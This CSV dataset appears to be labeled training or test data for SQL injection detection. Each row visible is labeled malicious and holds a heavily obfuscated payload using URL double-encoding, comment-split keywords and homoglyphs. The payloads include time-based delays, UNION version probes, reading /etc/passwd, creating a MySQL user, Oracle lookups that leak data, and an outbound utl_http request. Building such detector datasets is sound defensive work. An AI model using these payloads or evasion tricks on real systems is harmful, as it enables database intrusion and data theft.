Query,Label
SELECT * FROM (SELECT 'IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520or%2520pg_sleep%2520%2520%2528%2520%2520__TIME__%2520%2520%2529%2520%2520--') AS benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%2520%25E2%2580%25991%25E2%2580%2599%2520union%2520select%2520%2521%253C%2540%252Cversion%2520%2520%2528%2520%2520%2520%2520%2529%2520%2520%2520--%25201%25E2%2580%2599,1
SELECT * FROM (SELECT 'IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--declare%2520%2540q%2520nvarchar%2520%2520%2520%2528%2520%2520200%2520%2520%2529%2520%2520%2520select%2520%2540q%2520%2520%2520%253D%2520%2520%25200x770061%2520...') AS benign_sub,1
SELECT * FROM (SELECT ' o/**/r 1  =  1 o/**/r ’’  =  ’') AS benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520%2525%2521%253C1%2520or%25201%2520%2520%253D%2520%25201%2520--%25201,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--declare @q nvarchar   (  200  )   se/**/lect @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--%2520se/**/lect%2520%252A%2520fr/**/om%2520users%2520w/**/here%2520id%2520%2520%253D%2520%25201%2520o/**/r%2520%2522%255D1%2522%2520o/**/r%25201%2520%2520%253D%2520%25201%2520--%25201",1
"IF(1=1, SLEEP(5), 0)--%2520se/**/lect%2520%252A%2520fr/**/om%2520users%2520w/**/here%2520id%2520%2520%253D%2520%25201%2520o/**/r%2520%2524%252B%253C1%2520un/**/ion%2520se/**/lect%25201%252C%2540%2540VERSION%2520--%25201",1
SE/**/LECT * FR/**/OM (SE/**/LECT 'o/**/r%2520%2527unusual%2527%2520%2520%2520%253D%2520%2520%2520%2527unusual%2527') AS benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--%2520or%25201%2520in%2520%2520%2520%2528%2520%2520select%2520%2540%2540version%2520%2520%2529%2520%2520--,1
SELECT%2520%252A%2520FRΟM%2520%2528SELECT%2520%2527truncаte%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--%25D0%25B0s",1
"IF(1=1, SLEEP(5), 0)--%2518%2520o/**/r%25203%2520%2520%253D%2520%25203%2520--",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520%257C%257C1%2520union%2520select%25201%252Cbanner%2520from%2520v%2524version%2520where%2520rownum%2520%2520%253D%2520%25201%2520--%25201%2527%2529%2520AS%2520benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)-- select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--аdmin""  )   o/**/r   (  ""1""  =  ""1",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)-- se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r 1#""@ un/**/ion se/**/lect 'a',version  (    )   -- 1') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1  )   o/**/r benchmаrk  (  10000000,MD5  (  1   )    )   #",1
%2520se/**/lect%2520%252A%2520fr/**/om%2520users%2520w/**/here%2520id%2520%2520%253D%2520%25201%2520un/**/ion%2520se/**/lect%2520.1_%252Cversion%2520%2520%2528%2520%2520%2520%2520%2529%2520%2520%2520--%25201,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--%2520A/%252A%252A/ND%25201%2520%2520%253D%2520%2520utl_inaddr.get_host_address%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520SE/%252A%252A/LECT%2520SYS.DATABASE_NAME%2520FR/%252A%252A/OM%2520DUAL%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520A/%252A%252A/ND%2520%2527i%2527%2520%2520%253D%2520%2520%2527i,1
SELECT * FROM (SELECT '%2520or%25200%2520%2520%253D%2520%25200%2520%2523%2522') AS benign_sub,1
SE/**/LECT * FR/**/ΟM (SE/**/LECT ’se/**/lect * fr/**/om users w/**/here id  =  1 %$ 1 o/**/r 1  =  1 -- 1’) AS benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--se/**/lect * fr/**/om users w/**/here id  =  1 %!<@ o/**/r 1  =  1 -- 1') AS benign_sub",1
%253B%2520if%2520not%2520%2520%2528%2520%2520substring%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520se/%252A%252A/lect%2520%2540%2540version%2520%2520%2529%2520%2520%252C25%252C1%2520%2520%2529%2520%2520%2520%253C%253E%25200%2520%2520%2529%2520%2520%2520w%25D0%25B0itfo/%252A%252A/r%2520del%25D0%25B0y%2520%25E2%2580%25990%253A0%253A2%25E2%2580%2599%2520--,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1%2520%2520%2529%2520%2520%2520or%2520sleep%2520%2520%2528%2520%2520__TIME__%2520%2520%2529%2520%2520%2523') AS benign_sub",1
%2520se/%252A%252A/lect%2520%252A%2520fr/%252A%252A/om%2520users%2520w/%252A%252A/here%2520id%2520%2520%253D%2520%25201%2520o/%252A%252A/r%2520%25221_%2522%2520o/%252A%252A/r%25201%2520%2520%253D%2520%25201%2520--%25201,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT ' select * from users where id  =  1 <1## union select 1,version  (    )   -- 1') AS benign_sub",1
"SE/**/LECT * FR/**/ΟM (SE/**/LECT ’ se/**/lect * fr/**/om users w/**/here id  =  1 + $+*\ un/**/ion se/**/lect null,@@VERSIΟN -- 1’) AS benign_sub",1
SE/**/LECT%2520%252A%2520FR/**/OM%2520%2528SE/**/LECT%2520%2527se/**/lect%2520%252A%2520fr/**/om%2520users%2520w/**/here%2520id%2520%2520%253D%2520%25201.%2520%253C%2540%2520o/**/r%25201%2520%2520%253D%2520%25201%2520--%25201%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)-- o/**/r true--",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '; execute immediate 'sel' || 'ect us' || 'er'') AS benign_sub",1
hi%2527%2520o/**/r%2520%2527x%2527%2520%2520%253D%2520%2520%2527x%2527%253B,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT 'select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520%253C%2540%2520or%25201%2520%2520%253D%2520%25201%2520--%25201') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%2522.%252C%2522%2520or%25201%2520%2520%253D%2520%25201%2520--%25201,1
"IF(1=1, SLEEP(5), 0)--%25D0%25B0dmin%25E2%2580%2599%2520%2523",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520%253C%2540%2524_%2520union%2520select%25201%252Cversion%2520%2520%2528%2520%2520%2520%2520%2529%2520%2520%2520--%25201,1
"SE/**/LECT * FR/**/OM (SE/**/LECT ' se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r "",  (  "" o/**/r 1  =  1 -- 1') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%2522%252C%257B%2522%2520or%25201%2520%2520%253D%2520%25201%2520--%25201') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)-- un/**/ion se/**/lect 1,loаd_file  (  ’/etc/pаsswd’  )  ,1,1,1;",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--""  )  ;waitfo/**/r delay '0:0:__TIME__'--') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT ' or ’unusuаl’   =   ’unusuаl’') AS benign_sub",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--insert into mysql.user   (  user, host, passwo/**/rd  )   values   (  'name', 'localhost', passwo/**/rd  (  'pass123'   )    )   ') AS benign_sub",1
SELECT%2520%252A%2520FR%25CE%259FM%2520%2528SELECT%2520%25E2%2580%2599%25D0%25B0dmin%2522%2520or%2520%25221%2522%2520%2520%253D%2520%2520%25221%2522/%252A%25E2%2580%2599%2529%2520AS%2520benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%25221%2520%2520%2528%2520%2520%2522%2520%2520%253D%2520%25201%2520or%25201%2520%2520%253D%2520%25201%2520--%25201') AS benign_sub",1
SELECT * FROM (SELECT '%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%255C%253C1%2520union%2520select%25201%252C%2540%2540VERSI%25CE%259FN%2520--%25201') AS benign_sub,1
SE/**/LECT * FR/**/OM (SE/**/LECT 'like') AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527or%2520username%2520like%2520char%2520%2520%2528%2520%252037%2520%2520%2529%2520%2520%253B%2527%2529%2520AS%2520benign_sub",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)-- )    )    o/**/r pg_sleep  (  __TIME__  )  --') AS benign_sub",1
SE/%252A%252A/LECT%2520%252A%2520FR/%252A%252A/OM%2520%2528SE/%252A%252A/LECT%2520%2527se/%252A%252A/lect%2520%252A%2520fr/%252A%252A/om%2520users%2520w/%252A%252A/here%2520id%2520%2520%253D%2520%25201%2520o/%252A%252A/r%2520%2524%252B%253C%255C%2520o/%252A%252A/r%25201%2520%2520%253D%2520%25201%2520--%25201%2527%2529%2520AS%2520benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--o/**/r%25203%2520%2520%253D%2520%25203,1
"IF(1=1, SLEEP(5), 0)-- se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r ""  (  ."" o/**/r 1  =  1 -- 1",1
SELECT * FROM (SELECT 'se/**/lect%2520%252A%2520fr/**/om%2520users%2520w/**/here%2520id%2520%2520%253D%2520%25201%2520o/**/r%2520%2520%2520%2528%2520%2520%2524%252B%2520%2520%2529%2520%2520%2520%2520%253D%2520%25201%2520o/**/r%25201%2520%2520%253D%2520%25201%2520--%25201') AS benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--exec%2520sp,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%255C%252B%253C%2524%2520union%2520select%25201%252C%2540%2540VERSION%2520--%25201%2527%2529%2520AS%2520benign_sub,1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527se/%252A%252A/lect%2520%252A%2520fr/%252A%252A/om%2520users%2520w/%252A%252A/here%2520id%2520%2520%253D%2520%25201%2520o/%252A%252A/r%2520%255C%253C%2524%2520o/%252A%252A/r%25201%2520%2520%253D%2520%25201%2520--%25201%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)-- se/**/lect * fr/**/om users w/**/here id  =  1.&&1 un/**/ion se/**/lect 1,version  (    )   -- 1",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--аdmin%2527%2520or%25201%2520%2520%253D%2520%25201/%252A,1
а%2527%2520wаitfo/%252A%252A/r%2520delаy%2520%25270%253A0%253A10%2527--,1
"IF(1=1, SLEEP(5), 0)-- se/**/lect * fr/**/om users w/**/here id  =  1 +  (  \  )   un/**/ion se/**/lect null,@@VERSIΟN -- 1",1
"SELECT * FROM (SELECT ' se/**/lect * fr/**/om users w/**/here id  =  1 un/**/ion se/**/lect .1$_,version  (    )   -- 1') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--аnd 1 in   (  se/**/lect vаr fr/**/om temp  )  --",1
SE/%252A%252A/LECT%2520%252A%2520FR/%252A%252A/OM%2520%2528SE/%252A%252A/LECT%2520%2527hi%2527%2520%2520%2529%2520%2520%2520o/%252A%252A/r%2520%2520%2520%2528%2520%2520%2527a%2527%2520%2520%253D%2520%2520%2527a%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT ' A/**/ND 1  =  utl_inaddr.get_host_address   (    (   SE/**/LECT DISTINCT  (  column_name  )   FR/**/OM   (  SE/**/LECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FR/**/OM all_tab_columns  )   W/**/HERE LIMIT  =  1   )    )    A/**/ND 'i'  =  'i') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--admin%2522%2520o/%252A%252A/r%25201%2520%2520%253D%2520%25201,1
"IF(1=1, SLEEP(5), 0)--""  )   o/**/r true--",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--%2520se/%252A%252A/lect%2520%252A%2520fr/%252A%252A/om%2520users%2520w/%252A%252A/here%2520id%2520%2520%253D%2520%2520%25271%2527%2520o/%252A%252A/r%2520%2524%2520.%2520%2520%253D%2520%25201%2520un/%252A%252A/ion%2520se/%252A%252A/lect%25201%252C%2540%2540VERSION%2520--%25201%2527,1
"SELECT * FRΟM (SELECT ’IF(1=1, SLEEP(5), 0)-- select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1  )   o/**/r pg_sleep  (  __TIME__  )  --",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT ' se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r ""{."" o/**/r 1  =  1 -- 1') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--%2522%2520%2520%2529%2520%2520%2520o/**/r%2520sleep%2520%2520%2528%2520%2520__TIME__%2520%2520%2529%2520%2520%2520%2520%253D%2520%2520%2522,1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201.%253C%2540.%2520or%25201%2520%2520%253D%2520%25201%2520--%25201%2527%2529%2520AS%2520benign_sub,1
SE/%252A%252A/LECT%2520%252A%2520FR/%252A%252A/OM%2520%2528SE/%252A%252A/LECT%2520%2527admin%2522%2520%2520%2529%2520%2520%2520o/%252A%252A/r%2520%2520%2520%2528%2520%2520%25221%2522%2520%2520%253D%2520%2520%25221%2522--%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT ' se/**/lect * fr/**/om users w/**/here id  =  1<@.. un/**/ion se/**/lect 1,version  (    )   -- 1') AS benign_sub",1
SELECT * FROM (SELECT '%253B%2520exec%2520xp_regread') AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT ' se/**/lect * fr/**/om users w/**/here id  =  '1' + @ 1 un/**/ion se/**/lect 1,version  (    )   -- 1'') AS benign_sub",1
SELECT%2520%252A%2520FR%25CE%259FM%2520%2528SELECT%2520%25E2%2580%2599select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520%252B%2520%255C%252B%25251%2520or%25201%2520%2520%253D%2520%25201%2520--%25201%25E2%2580%2599%2529%2520AS%2520benign_sub,1
SELECT * FROM (SELECT '%2520se/**/lect%2520%252A%2520fr/**/om%2520users%2520w/**/here%2520id%2520%2520%253D%2520%25201%2520o/**/r%2520%2522%253B1%2522%2520o/**/r%25201%2520%2520%253D%2520%25201%2520--%25201') AS benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%2522%2525%2526%2522%2520or%25201%2520%2520%253D%2520%25201%2520--%25201') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1 аnd 1  =  1",1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527o/%252A%252A/r%25200%2520%2520%253D%2520%25200%2520%2523%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--un/**/ion se/**/lect * fr/**/om users w/**/here login   =   chаr ...",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT ' se/**/lect * fr/**/om users w/**/here id  =  1 un/**/ion se/**/lect 1||@,version  (    )   -- 1') AS benign_sub",1
"SE/**/LECT * FR/**/OM (SE/**/LECT 'IF(1=1, SLEEP(5), 0)--admin'  )   o/**/r '1'  =  '1'--') AS benign_sub",1
SELECT * FROM (SELECT '1;SE/**/LECT *') AS benign_sub,1
SELECT%2520%252A%2520FR%25CE%259FM%2520%2528SELECT%2520%25E2%2580%2599%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%2522%257B%253B%2522%2520or%25201%2520%2520%253D%2520%25201%2520--%25201%25E2%2580%2599%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’x’ аnd 1  =    (  select count  (  *  )   from tаbnаme  )  ; --’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--%2520se/**/lect%2520%252A%2520fr/**/om%2520users%2520w/**/here%2520id%2520%2520%253D%2520%2520%25271%2527%2520o/**/r%2520%2522%2522%253C%2540%2520un/**/ion%2520se/**/lect%25201%252Cversion%2520%2520%2528%2520%2520%2520%2520%2529%2520%2520%2520--%25201%2527",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT ' se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r ""?,"" o/**/r 1  =  1 -- 1') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--%2520se/%252A%252A/lect%2520%252A%2520fr/%252A%252A/om%2520users%2520w/%252A%252A/here%2520id%2520%2520%253D%2520%2520%25271%2527%2520%257C%257C1%2520un/%252A%252A/ion%2520se/%252A%252A/lect%25201%252Cbanner%2520fr/%252A%252A/om%2520v%2524version%2520w/%252A%252A/here%2520rownum%2520%2520%253D%2520%25201%2520--%25201%2527",1
"SE/**/LECT * FRΟM (SE/**/LECT ’1 o/**/r benchmаrk  (  10000000,MD5  (  1   )    )   #’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT 'procedure') AS benign_sub",1
SELECT * FRΟM (SELECT ’o/**/r ’’  =  ’’) AS benign_sub,1
"IF(1=1, SLEEP(5), 0)-- A/**/ND 1  =  utl_inаddr.get_host_аddress   (    (   SE/**/LECT SYS.LΟGIN_USER FRΟM DUAL   )    )    A/**/ND ’i’  =  ’i",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)-- AND 1  =  utl_inаddr.get_host_аddress   (    (   SELECT DISTINCT  (  USERNAME  )   FRΟM   (  SELECT DISTINCT  (  USERNAME  )  , RΟWNUM AS LIMIT FRΟM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND ’i’  =  ’i') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT '\'; desc users; --') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)-- se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r   (  \.  )    =  1 un/**/ion se/**/lect 1,@@VERSIΟN -- 1",1
SELECT%2520%252A%2520FRΟM%2520%2528SELECT%2520%2527select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%2520%25271%2527%2520or%2520%2524%25201%2520%2520%253D%2520%25201%2520or%25201%2520%2520%253D%2520%25201%2520--%25201%2527%2527%2529%2520AS%2520benign_sub,1
SE/**/LECT%2520%252A%2520FR/**/OM%2520%2528SE/**/LECT%2520%2527%2522%2520o/**/r%2520%2522%2522%255E%2522%2527%2529%2520AS%2520benign_sub,1
SE/**/LECT%2520%252A%2520FR/**/OM%2520%2528SE/**/LECT%2520%2527%2522-%2522%2527%2529%2520AS%2520benign_sub,1
%2520se/**/lect%2520%252A%2520fr/**/om%2520users%2520w/**/here%2520id%2520%2520%253D%2520%25201%2520o/**/r%2520%255C%253C%2520%2520%2520%253D%2520%25201%2520un/**/ion%2520se/**/lect%25201%252C%2540%2540VERSIΟN%2520--%25201,1
"IF(1=1, SLEEP(5), 0)-- se/**/lect * fr/**/om users w/**/here id  =  1 un/**/ion se/**/lect 1<@$,version  (    )   -- 1",1
%2520se/%252A%252A/lect%2520%252A%2520fr/%252A%252A/om%2520users%2520w/%252A%252A/here%2520id%2520%2520%253D%2520%25201%2520%252A%255C%2520un/%252A%252A/ion%2520se/%252A%252A/lect%2520null%252C%2540%2540VERSI%25CE%259FN%2520--%25201,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)-- select * from users where id  =  ’1’ or !<@ union select 1,version  (    )   -- 1’') AS benign_sub",1
%2520se/%252A%252A/lect%2520%252A%2520fr/%252A%252A/om%2520users%2520w/%252A%252A/here%2520id%2520%2520%253D%2520%25201%2520o/%252A%252A/r%2520%2522.%2525%2522%2520o/%252A%252A/r%25201%2520%2520%253D%2520%25201%2520--%25201,1
"IF(1=1, SLEEP(5), 0)--аdmin’/*",1
SELECT%2520%252A%2520FR%25CE%259FM%2520%2528SELECT%2520%25E2%2580%2599%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%2522%2520%2520%2528%2520%2520%2523%2522%2520or%25201%2520%2520%253D%2520%25201%2520--%25201%25E2%2580%2599%2529%2520AS%2520benign_sub,1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527%257C%257CUTL_HTTP.REQUEST%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--%2520AND%25201%2520%2520%253D%2520%2520utl_inаddr.get_host_аddress%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520SELECT%2520DISTINCT%2520%2520%2528%2520%2520tаble_nаme%2520%2520%2529%2520%2520%2520FRΟM%2520%2520%2520%2528%2520%2520SELECT%2520DISTINCT%2520%2520%2528%2520%2520tаble_nаme%2520%2520%2529%2520%2520%252C%2520RΟWNUM%2520AS%2520LIMIT%2520FRΟM%2520sys.аll_tаbles%2520%2520%2529%2520%2520%2520WHERE%2520LIMIT%2520%2520%253D%2520%25201%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520AND%2520%2527i%2527%2520%2520%253D%2520%2520%2527i",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)-- select * from users where id  =  ’1’<@.. union select 1,version  (    )   -- 1’') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520or%2520benchmаrk%2520%2520%2528%2520%252010000000%252CMD5%2520%2520%2528%2520%25201%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2523",1
SELECT * FROM (SELECT '%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520%253C%2540.%2524%2520union%2520select%25201%252Cversion%2520%2520%2528%2520%2520%2520%2520%2529%2520%2520%2520--%25201') AS benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%2524%2520.%2520%2520%253D%2520%25201%2520union%2520select%25201%252C%2540%2540VERSION%2520--%25201%2527%2529%2520AS%2520benign_sub,1
se/%252A%252A/lect%2520%252A%2520fr/%252A%252A/om%2520users%2520w/%252A%252A/here%2520id%2520%2520%253D%2520%2520%25E2%2580%25991%25E2%2580%2599%2520%253C%2540.%2524%2520o/%252A%252A/r%25201%2520%2520%253D%2520%25201%2520--%25201%25E2%2580%2599,1
1%2520uni/%252A%252A/on%2520se/%252A%252A/lect%2520%25D0%25B0ll%2520fr/%252A%252A/om%2520w/%252A%252A/here,1
"IF(1=1, SLEEP(5), 0)--%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520%252B%2524%2520.%2520union%2520select%2520null%252C%2540%2540VERSIΟN%2520--%25201",1
SELECT * FROM (SELECT '%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%25201%2523%2522%253F%2520union%2520select%2520null%252Cversion%2520%2520%2528%2520%2520%2520%2520%2529%2520%2520%2520--%25201') AS benign_sub,1
SELECT%2520%252A%2520FRΟM%2520%2528SELECT%2520%2527аdmin%2527%2520%2520%2529%2520%2520%2520or%2520%25271%2527%2520%2520%253D%2520%2520%25271%2527%2523%2527%2529%2520AS%2520benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--%257C%257Cutl_http.request%2520%2520%2528%2520%2520%2527httP%253A//192.168.1.1/%2527%2520%2520%2529%2520%2520%257C%257C%2527,1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’or ’7659’  =  ’7659’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%2522%257B%2540%2522%2520or%25201%2520%2520%253D%2520%25201%2520--%25201%2527%2529%2520AS%2520benign_sub",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT ' se/**/lect * fr/**/om users w/**/here id  =  1 un/**/ion se/**/lect +!<1,version  (    )   -- 1') AS benign_sub",1
SELECT * FROM (SELECT '%2520A/%252A%252A/ND%25201%2520%2520%253D%2520%2520utl_inaddr.get_host_address%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520SE/%252A%252A/LECT%2520DISTINCT%2520%2520%2528%2520%2520granted_role%2520%2520%2529%2520%2520%2520FR/%252A%252A/OM%2520%2520%2520%2528%2520%2520SE/%252A%252A/LECT%2520DISTINCT%2520%2520%2528%2520%2520granted_role%2520%2520%2529%2520%2520%252C%2520ROWNUM%2520AS%2520LIMIT%2520FR/%252A%252A/OM%2520dba_role_privs%2520W/%252A%252A/HERE%2520GRANTEE%2520%2520%253D%2520%2520SYS.LOGINUSER%2520%2520%2529%2520%2520%2520W/%252A%252A/HERE%2520LIMIT%2520%2520%253D%2520%25206%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520A/%252A%252A/ND%2520%2527i%2527%2520%2520%253D%2520%2520%2527i') AS benign_sub,1
